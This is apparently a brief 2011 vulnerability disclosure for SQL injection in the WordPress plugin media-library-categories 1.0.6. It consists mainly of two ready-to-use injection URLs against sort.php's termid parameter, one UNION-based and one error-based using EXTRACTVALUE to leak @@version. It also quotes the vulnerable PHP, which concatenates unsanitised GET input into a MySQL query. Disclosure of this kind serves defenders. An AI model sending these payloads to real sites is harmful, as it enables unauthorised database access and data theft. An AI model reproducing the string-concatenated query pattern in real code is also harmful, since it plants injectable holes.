# Date: 2011-08-06
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 1.0.6 (tested)
 
---
PoC
---
http://www.site.com/wp-content/plugins/media-library-categories/sort.php?termid=-1 UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
 
http://www.site.com/wp-content/plugins/media-library-categories/sort.php?termid=1 AND EXTRACTVALUE(1,CONCAT(CHAR(92),@@version))
 
---------------
Vulnerable code
---------------
$termid=$_GET['termid'];
 
...
 
$where = '';
if($termid)
{
    $where .= " && tt.term_id=".$termid;
}
 
...
 
            where ttt.taxonomy='media_category' $where order by a.term_order asc;";
 
$results = mysql_query($query); 



